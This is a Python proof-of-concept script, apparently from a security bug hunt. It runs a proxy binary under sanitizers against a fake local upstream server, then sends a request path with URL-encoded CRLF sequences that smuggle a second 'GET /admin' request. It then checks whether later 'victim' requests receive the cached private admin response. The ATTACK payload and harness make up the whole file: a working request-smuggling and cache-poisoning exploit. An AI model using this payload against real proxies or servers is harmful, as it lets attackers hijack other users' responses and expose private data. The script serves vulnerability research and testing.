import socket, threading, time, os, sys, subprocess
ROOT='/tmp/toksec-hunt'; BIN=sys.argv[1] if len(sys.argv)>1 else ROOT+'/s5prod'
CFG=sys.argv[2] if len(sys.argv)>2 else ROOT+'/cfg5single'
CP=18451; UP=18471
log=[]; lock=threading.Lock(); stop=False

srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(('127.0.0.1',UP)); srv.listen(8); srv.settimeout(0.2)

def handle(c):
    buf=b''; n=0
    try:
        c.settimeout(6)
        while not stop:
            while b'\r\n\r\n' not in buf:
                d=c.recv(65536)
                if not d: return
                buf+=d
            e=buf.index(b'\r\n\r\n'); head=buf[:e]; buf=buf[e+4:]
            n+=1
            with lock: log.append(head.decode('latin1','replace'))
            if n==1:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nCLEAN')
            elif b'/admin' in head:
                time.sleep(0.35)
                b=b'ADMIN-PRIVATE'
                c.sendall(b'HTTP/1.1 200 OK\r\nCache-Control: public, max-age=60\r\nContent-Length: %d\r\n\r\n'%len(b)+b)
            else:
                time.sleep(0.2)
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 6\r\n\r\nLATER!')
    except Exception: pass
    finally:
        try: c.close()
        except: pass
def loop():
    while not stop:
        try: c,_=srv.accept()
        except socket.timeout: continue
        except OSError: break
        threading.Thread(target=handle,args=(c,),daemon=True).start()
threading.Thread(target=loop,daemon=True).start()

env=dict(os.environ); env['ASAN_OPTIONS']='log_path=%s/paasan:abort_on_error=1:detect_leaks=0'%ROOT
env['UBSAN_OPTIONS']='print_stacktrace=1'
p=subprocess.Popen([BIN,'--config',CFG],stdout=open(ROOT+'/pa.log','wb'),stderr=subprocess.STDOUT,env=env)
time.sleep(0.6)

def req(t,wait=2.5):
    s=socket.create_connection(('127.0.0.1',CP),2); s.settimeout(wait)
    s.sendall(b'GET '+t+b' HTTP/1.1\r\nHost: alpha.test\r\n\r\n')
    buf=b''
    try:
        while True:
            d=s.recv(65536)
            if not d: break
            buf+=d
            if b'\r\n\r\n' in buf:
                h,b=buf.split(b'\r\n\r\n',1); cl=0
                for ln in h.split(b'\r\n')[1:]:
                    if ln.lower().startswith(b'content-length:'): cl=int(ln.split(b':',1)[1])
                if len(b)>=cl: break
    except socket.timeout: pass
    s.close(); return buf

ATTACK=(b'/%70roxy/x%0D%0AHost:%20up%0D%0A%0D%0A'
        b'GET%20/admin%20HTTP/1.1%0D%0AHost:%20up%0D%0AX-Pad:%20')
print('ATTACKER ->', req(ATTACK))
time.sleep(1.3)
print('VICTIM-1 ->', req(b'/proxy/victim')[:180])
time.sleep(0.6)
print('VICTIM-2 ->', req(b'/proxy/other')[:180])
with lock:
    print('--- upstream parsed %d heads ---'%len(log))
    for i,t in enumerate(log,1): print(' %d: %r'%(i,t))
stop=True; p.terminate(); time.sleep(0.2)
try: p.kill()
except: pass
try: srv.close()
except: pass
print('--- srvlog ---'); print(open(ROOT+'/pa.log','rb').read()[:500].decode('latin1','replace'))
